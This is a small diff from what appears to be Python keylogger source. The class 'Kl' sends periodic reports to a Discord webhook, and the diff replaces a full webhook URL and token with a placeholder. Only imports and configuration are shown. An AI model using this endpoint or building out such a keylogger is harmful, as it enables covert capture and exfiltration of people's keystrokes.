@@ -6,7 +6,7 @@ import subprocess, shutil, sys, stat, platform, getpass
 import shelve, os
 
 SEND_REPORT_EVERY = 60
-WEBHOOK = "https://discord.com/api/webhooks/921435574357876776/96Pbi7Ux8RzV6l7YMr3g5m_GI2R3ejRELNZCGafS2cNOcbTQ8_ZQkVrLfmgPKehIomAT"
+WEBHOOK = "discord webhook"
 
 class Kl: 
     def __init__(self, interval, WEBHOOK):
